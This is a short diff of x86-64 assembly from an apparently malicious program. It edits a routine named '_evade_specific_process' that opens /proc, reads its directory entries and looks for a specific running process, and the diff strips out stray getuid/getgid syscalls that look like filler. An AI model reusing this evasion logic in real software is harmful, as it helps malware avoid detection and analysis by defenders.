@@ -164,12 +164,7 @@ _evade_specific_process:                                  ; cd to /proc
 	mov qword [r15], '/pro'
 	mov qword [r15 + 4], 'c'
 	lea rdi, [r15]
-	mov rax, SYS_GETUID
-	syscall
 	mov rax, SYS_CHDIR
-	syscall
-
-	mov rax, SYS_GETGID
 	syscall
 
 	cmp rax, 0
@@ -195,9 +190,6 @@ _evade_specific_process:                                  ; cd to /proc
 
 		cmp rax, 0                                     ; no more files in the directory to read
 		je _close_proc
-
-		mov rax, SYS_GETGID
-		syscall
 
 		xor r14, r14                                   ; i = 0 for the first iteration
 		mov r13, rax                                   ; r13 stores the number of read bytes with getdents
